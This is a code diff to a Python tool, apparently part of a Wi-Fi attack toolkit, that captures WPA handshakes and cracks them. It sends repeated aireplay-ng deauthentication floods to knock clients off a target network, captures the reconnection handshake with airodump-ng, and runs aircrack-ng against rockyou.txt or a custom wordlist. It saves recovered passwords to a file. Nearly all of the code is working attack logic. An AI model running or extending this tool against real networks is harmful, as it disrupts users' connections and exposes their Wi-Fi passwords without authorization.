@@ -6,7 +6,7 @@ import time
 import os
 import shutil
 from datetime import datetime
-from modules.utils import (
+from .utils import (
     get_interface,
     setup_monitor_mode,
     get_data_path,
@@ -170,11 +170,17 @@ class HandshakeCapture:
     def capture_handshake(self):
         """Capture WPA handshake using targeted deauth"""
         try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            # Format timestamp for better readability: YYYY-MM-DD_HHMMSS
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
+            
+            # Create capture filename with network BSSID and timestamp
+            sanitized_bssid = self.target_bssid.replace(':', '')
             self.capture_file = os.path.join(
                 self.data_path['captures'],
-                f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}'
+                f'handshake_{sanitized_bssid}_{timestamp}'
             )
+            
+            self.console.print(f"[cyan]Capture will be saved as: {self.capture_file}-01.cap[/cyan]")
             
             # Start airodump-ng to capture handshake
             capture_cmd = [
@@ -201,17 +207,17 @@ class HandshakeCapture:
             if clients:
                 self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                 
-                # Send deauth to each client
+                # Phase 1: Send deauth packets for 5 seconds
                 with Progress(
                     SpinnerColumn(),
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    for client in clients:
-                        task = progress.add_task(f"[cyan]Deauthenticating client: {client}", total=None)
-                        
-                        # Send deauth packets
-                        for _ in range(5):
+                    task = progress.add_task("[red]Sending deauth packets...", total=50)
+                    
+                    # Send deauth packets for 5 seconds (10 packets per second)
+                    for _ in range(50):
+                        for client in clients:
                             deauth_cmd = [
                                 'aireplay-ng',
                                 '--deauth', '1',
@@ -220,27 +226,38 @@ class HandshakeCapture:
                                 self.interface
                             ]
                             subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                            time.sleep(0.1)
-                            
-                            # Check for handshake
-                            if self.verify_handshake():
-                                capture_process.terminate()
-                                return True
-                        
-                        progress.update(task, completed=True)
-                        time.sleep(0.5)  # Wait between clients
-            else:
-                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
+                        progress.update(task, advance=1)
+                        time.sleep(0.1)  # Small delay between packets
                 
-                # Send broadcast deauth with progress
+                # Phase 2: Wait for reconnection and handshake
                 with Progress(
                     SpinnerColumn(),
                     TextColumn("[progress.description]{task.description}"),
                     TimeElapsedColumn(),
                 ) as progress:
-                    task = progress.add_task("[cyan]Sending broadcast deauth", total=None)
+                    task = progress.add_task("[cyan]Waiting for handshake...", total=50)
                     
-                    for _ in range(10):
+                    # Wait for 5 seconds, checking for handshake
+                    for _ in range(50):
+                        if self.verify_handshake():
+                            self.console.print("\n[green]Handshake captured![/green]")
+                            capture_process.terminate()
+                            return True
+                        progress.update(task, advance=1)
+                        time.sleep(0.1)
+            else:
+                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
+                
+                # Phase 1: Send broadcast deauth packets for 5 seconds
+                with Progress(
+                    SpinnerColumn(),
+                    TextColumn("[progress.description]{task.description}"),
+                    TimeElapsedColumn(),
+                ) as progress:
+                    task = progress.add_task("[red]Sending broadcast deauth...", total=50)
+                    
+                    # Send broadcast deauth packets for 5 seconds (10 packets per second)
+                    for _ in range(50):
                         deauth_cmd = [
                             'aireplay-ng',
                             '--deauth', '1',
@@ -248,18 +265,35 @@ class HandshakeCapture:
                             self.interface
                         ]
                         subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        progress.update(task, advance=1)
                         time.sleep(0.1)
-                        
-                        # Check for handshake
-                        if self.verify_handshake():
-                            capture_process.terminate()
-                            progress.update(task, completed=True)
-                            return True
+                
+                # Phase 2: Wait for reconnection and handshake
+                with Progress(
+                    SpinnerColumn(),
+                    TextColumn("[progress.description]{task.description}"),
+                    TimeElapsedColumn(),
+                ) as progress:
+                    task = progress.add_task("[cyan]Waiting for handshake...", total=50)
                     
-                    progress.update(task, completed=True)
+                    # Wait for 5 seconds, checking for handshake
+                    for _ in range(50):
+                        if self.verify_handshake():
+                            self.console.print("\n[green]Handshake captured![/green]")
+                            capture_process.terminate()
+                            return True
+                        progress.update(task, advance=1)
+                        time.sleep(0.1)
             
             capture_process.terminate()
-            return self.verify_handshake()
+            
+            # Final check for handshake
+            if self.verify_handshake():
+                self.console.print("\n[green]Handshake captured![/green]")
+                return True
+            else:
+                self.console.print("\n[red]No handshake captured.[/red]")
+                return False
             
         except Exception as e:
             self.console.print(f"[red]Error capturing handshake: {str(e)}[/red]")
@@ -342,15 +376,36 @@ class HandshakeCapture:
             return False
 
     def crack_password(self, capture_file):
-        """Crack the captured handshake using rockyou.txt"""
+        """Crack the captured handshake using rockyou.txt or custom wordlist"""
         try:
             if not os.path.exists(capture_file):
                 self.console.print("[red]Error: Capture file not found![/red]")
                 return False
 
-            if not self.rockyou_path or not os.path.exists(self.rockyou_path):
-                self.console.print("[red]Error: rockyou.txt not found![/red]")
-                return False
+            # Ask user for wordlist choice
+            self.console.print("\n[cyan]Wordlist Options:[/cyan]")
+            self.console.print("1. Use default wordlist (rockyou.txt)")
+            self.console.print("2. Use custom wordlist")
+            
+            while True:
+                try:
+                    choice = input("\nSelect option (1-2): ").strip()
+                    if choice == "1":
+                        if not self.rockyou_path or not os.path.exists(self.rockyou_path):
+                            self.console.print("[red]Error: rockyou.txt not found![/red]")
+                            return False
+                        wordlist_path = self.rockyou_path
+                        break
+                    elif choice == "2":
+                        custom_path = input("\nEnter path to custom wordlist: ").strip()
+                        if os.path.exists(custom_path):
+                            wordlist_path = custom_path
+                            break
+                        else:
+                            self.console.print("[red]Error: Wordlist file not found![/red]")
+                except ValueError:
+                    pass
+                self.console.print("[red]Invalid choice![/red]")
 
             # Setup output file
             password_file = os.path.join(
@@ -364,7 +419,7 @@ class HandshakeCapture:
             process = subprocess.Popen(
                 [
                     'aircrack-ng',
-                    '-w', self.rockyou_path,
+                    '-w', wordlist_path,
                     '-l', password_file,
                     '-b', self.target_bssid,
                     capture_file
@@ -422,6 +477,7 @@ class HandshakeCapture:
                                 rf.write(f"BSSID: {self.target_bssid}\n")
                                 rf.write(f"Channel: {self.target_channel}\n")
                                 rf.write(f"Password: {password}\n")
+                                rf.write(f"Wordlist: {wordlist_path}\n")
                                 rf.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                 rf.write(f"Time taken: {int(time.time() - start_time)} seconds\n")
                             return True
@@ -484,6 +540,4 @@ class HandshakeCapture:
                              stderr=subprocess.DEVNULL)
                 cleanup_temp_files()
             except:
-                pass
-            
-            pass 
+                pass 
